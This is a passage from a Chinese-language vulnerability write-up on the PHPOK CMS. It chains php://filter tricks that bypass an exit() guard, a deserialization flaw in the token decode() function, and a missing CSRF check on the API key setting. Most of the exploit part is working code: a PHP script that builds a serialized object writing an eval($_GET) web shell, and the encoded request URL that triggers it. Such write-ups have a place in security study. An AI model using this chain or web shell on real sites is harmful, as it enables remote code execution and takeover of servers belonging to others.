class="keyword">$this</span>-&gt;key_id,<span class="keyword">$this</span>-&gt;key_list);<span class="comment">//调用save</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;expired();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$id</span> || <span class="variable">$content</span> === <span class="string">&#x27;&#x27;</span> || !<span class="keyword">$this</span>-&gt;status)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_time();</span><br><span class="line">		<span class="variable">$content</span> = serialize(<span class="variable">$content</span>);</span><br><span class="line">		<span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;folder.<span class="variable">$id</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">		file_put_contents(<span class="variable">$file</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_time();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_count();</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;app&#x27;</span>]-&gt;db)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;key_list(<span class="variable">$id</span>,<span class="variable">$GLOBALS</span>[<span class="string">&#x27;app&#x27;</span>]-&gt;db-&gt;cache_index(<span class="variable">$id</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="绕过exit"><a href="#绕过exit" class="headerlink" title="绕过exit()"></a>绕过exit()</h3><p>save方法中使用了file_put_contents函数，第一个和第二个参数均可控，第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行，可以通过php://filter伪协议使拼接的<code>&lt;?php exit();?&gt;</code>失效</p>
<p>来源于</p>
<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/981">基于php://filter协议对exit函数几种逃逸方法的分析</a></p>
<h4 id="1-string-strip-tags"><a href="#1-string-strip-tags" class="headerlink" title="1.string.strip_tags"></a>1.string.strip_tags</h4><p><strong>该特性从PHP 7.3.0起废弃</strong></p>
<p><code>&lt;?php exit()?&gt;</code>本质是XML标签，可以使用<code>strip_tags()</code>函数去除它。为了防止我们写入的代码也被去除，需要把代码base64编码后写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>将&lt;?php phpinfo();进行base64编码后提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>写入成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e328053380001383b3f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fb94221b-0076-4065-834a-17976701d407.png" alt="imgbed.cn图床"></a></p>
<h4 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h4><p>base64编码结果只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时(如<code>&lt;</code>、<code>&gt;</code>、<code>?</code>、<code>;</code>、<code>(</code>、<code>)</code>等)，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，如<code>&lt;?php exit();?&gt;</code>就会先变成<code>phpexit</code>再进行解码，phpexit一共7个字符，而base64解码算法是4个byte一组，所以再在后面任意添加一位，比如<code>a</code>，这样就是<code>phpexita</code>再在后面接上一句话的base64编码，前面八位phpexita解码结果是乱码不会被执行，后面接着解码一句话的base64编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;aPD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e43002aec00018e1506"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/0689df6f-e7ca-473f-9af4-9f420a2e006e.png" alt="imgbed.cn图床"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e3def338d00016bab21"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/46978b5f-e655-40e5-8eb0-bf09082501ad.png" alt="imgbed.cn图床"></a></p>
<h4 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3.rot13"></a>3.rot13</h4><p><code>&lt;?php exit(); ?&gt;</code>在经过<code>rot13</code>编码后会变成<code>&lt;?cuc rkvg(); ?&gt;</code>，在<code>php</code>不开启<code>short_open_tag</code>时，<code>php</code>不认识这个字符串，也就不会被执行，<code>&lt;?php phpinfo();?&gt;</code>经过rot13编码后的结果为<code>&lt;?cuc cucvasb();?&gt;</code></p>
<p>提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e4920be4e0001cb1264"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/c46c68fe-cc7e-4815-8fa6-384b74837f82.png" alt="imgbed.cn图床"></a></p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>由名称得知decode()为解密函数，encode()为加密函数，encode()调用serialize()，decode()中调用unserialize()，找到调用decode()处，把序列化后的恶意类用encode()加密再使用decode()解密并进行反序列化。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">token_lib</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keyid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keyc_length</span> = <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keya</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keyb</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$time</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$expiry</span> = <span class="number">3600</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">keyid</span>(<span class="params"><span class="variable">$keyid</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$keyid</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="variable">$keyid</span>));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;config();</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">config</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;keya = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;keyb = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$string</span> = serialize(<span class="variable">$string</span>);<span class="comment">//序列化</span></span><br><span class="line">		<span class="variable">$expiry_time</span> = <span class="keyword">$this</span>-&gt;expiry ? <span class="keyword">$this</span>-&gt;expiry : <span class="number">365</span>*<span class="number">24</span>*<span class="number">3600</span>;</span><br><span class="line">		<span class="variable">$string</span> = sprintf(<span class="string">&#x27;%010d&#x27;</span>,(<span class="variable">$expiry_time</span> + <span class="keyword">$this</span>-&gt;time)).substr(md5(<span class="variable">$string</span>.<span class="keyword">$this</span>-&gt;keyb), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;	</span><br><span class="line">		<span class="variable">$keyc</span> = substr(md5(microtime().rand(<span class="number">1000</span>,<span class="number">9999</span>)), -<span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line">		<span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line">		<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$keyc</span>.str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode(<span class="variable">$rs</span>));</span><br><span class="line">		<span class="comment">//return $keyc.base64_encode($rs);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$string</span> = str_replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">		<span class="variable">$keyc</span> = substr(<span class="variable">$string</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line">		<span class="variable">$string</span> = base64_decode(substr(<span class="variable">$string</span>, <span class="keyword">$this</span>-&gt;keyc_length));</span><br><span class="line">		<span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line">		<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line">		<span class="variable">$chkb</span> = substr(md5(substr(<span class="variable">$rs</span>,<span class="number">26</span>).<span class="keyword">$this</span>-&gt;keyb),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">		<span class="keyword">if</span>((substr(<span class="variable">$rs</span>, <span class="number">0</span>, <span class="number">10</span>) - <span class="keyword">$this</span>-&gt;time &gt; <span class="number">0</span>) &amp;&amp; substr(<span class="variable">$rs</span>, <span class="number">10</span>, <span class="number">16</span>) == <span class="variable">$chkb</span>)&#123;</span><br><span class="line">			<span class="variable">$info</span> = substr(<span class="variable">$rs</span>, <span class="number">26</span>);</span><br><span class="line">			<span class="keyword">return</span> unserialize(<span class="variable">$info</span>);<span class="comment">//反序列化</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>encode()和decode()都要求keyid，全局搜索得到keyid来源于管理员设置的api_code</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;lib(<span class="string">&#x27;token&#x27;</span>)-&gt;keyid(<span class="keyword">$this</span>-&gt;site[<span class="string">&#x27;api_code&#x27;</span>]);</span><br></pre></td></tr></table></figure>



<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>在后台找到API验证串设置处 </p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e548053380001383ba6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/cbfb37f0-9677-4d21-85ea-a59dc9835fa9.png" alt="imgbed.cn图床"></a></p>
<p>抓包后发现无csrf防护，构造请求诱导管理员访问即可</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e4ee857bd0001015b56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a1149187-1e39-4700-9605-401363ff929c.png" alt="imgbed.cn图床"></a></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>构造脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key_id</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key_list</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$folder</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key_id = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key_list = <span class="string">&#x27;aa&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;folder = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">token</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyc_length</span> = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keya</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyb</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$time</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$expiry</span> = <span class="number">3600</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">keyid</span>(<span class="params"><span class="variable">$keyid</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$keyid</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="variable">$keyid</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">config</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keya = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keyb = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expiry_time</span> = <span class="keyword">$this</span>-&gt;expiry ? <span class="keyword">$this</span>-&gt;expiry : <span class="number">365</span>*<span class="number">24</span>*<span class="number">3600</span>;</span><br><span class="line">        <span class="variable">$string</span> = sprintf(<span class="string">&#x27;%010d&#x27;</span>,(<span class="variable">$expiry_time</span> + time())).substr(md5(<span class="variable">$string</span>.<span class="keyword">$this</span>-&gt;keyb), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;</span><br><span class="line">        <span class="variable">$keyc</span> = substr(md5(microtime().rand(<span class="number">1000</span>,<span class="number">9999</span>)), -<span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line">        <span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line">        <span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$keyc</span>.str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode(<span class="variable">$rs</span>));</span><br><span class="line">        <span class="comment">//return $keyc.base64_encode($rs);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">core</span>(<span class="params"><span class="variable">$string</span>,<span class="variable">$cryptkey</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key_length</span> = strlen(<span class="variable">$cryptkey</span>);</span><br><span class="line">        <span class="variable">$string_length</span> = strlen(<span class="variable">$string</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$box</span> = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">        <span class="variable">$rndkey</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 产生密匙簿</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$rndkey</span>[<span class="variable">$i</span>] = ord(<span class="variable">$cryptkey</span>[<span class="variable">$i</span> % <span class="variable">$key_length</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$i</span>] + <span class="variable">$rndkey</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$i</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$i</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 核心加解密部分</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$a</span> = <span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$string_length</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$a</span> = (<span class="variable">$a</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$a</span>]) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$a</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$a</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">            <span class="variable">$result</span> .= chr(ord(<span class="variable">$string</span>[<span class="variable">$i</span>]) ^ (<span class="variable">$box</span>[(<span class="variable">$box</span>[<span class="variable">$a</span>] + <span class="variable">$box</span>[<span class="variable">$j</span>]) % <span class="number">256</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="keyword">new</span> token();</span><br><span class="line"><span class="variable">$token</span>-&gt;keyid(<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>-&gt;encode(serialize(<span class="keyword">new</span> cache));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>运行脚本得到payload</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e5f5dc5370001a46220"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ea1a0588-8774-42f4-9c2a-0fa55ed7e6a0.png" alt="imgbed.cn图床"></a>](<a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb">https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb</a>)</p>
<p>在index_cotrol.php中的phpok_f方法中发现调用decode</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/1e6a2d1e-93dd-4606-b9e9-a7172ee26902.png" alt="imgbed.cn图床"></a></p>
<p>根据路由规则请求url,token为payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;phpok&#x2F;api.php?c&#x3D;index&amp;f&#x3D;phpok&amp;token&#x3D;478ef7obit5nzTBxeDcrCXjGxB4ifLSKWvkWtVrpSmI9W4o0rjCDuphi5+PHD0vNqavv0lx0PQ+v&#x2F;RfRV&#x2F;CPv81ncmZb2RJy2eYWxxRII1wSLQ825xh7jrjXMPjbAZ6gUiAuCb2HSMz&#x2F;vizU53Wfc64OIB&#x2F;5FYAH0OcBENNyngihF9LNgQ5pxVQkf2EAvG0T7AbWMb6prp0ZTaZ19SbZdAeKV3AB8LApao8nODRRNLutAwh5k6MUefwjD9lU&#x2F;Czv0n&#x2F;UXAGlIl+asWwzpz6pMYfHTbIc5Byug4</span><br></pre></td></tr></table></figure>



<p>利用成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e6534dcf3000102fb90"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ec806660-0cbe-4b59-959d-bfc31b86d382.png" alt="imgbed.cn图床"></a></p>
<p>参考：</p>
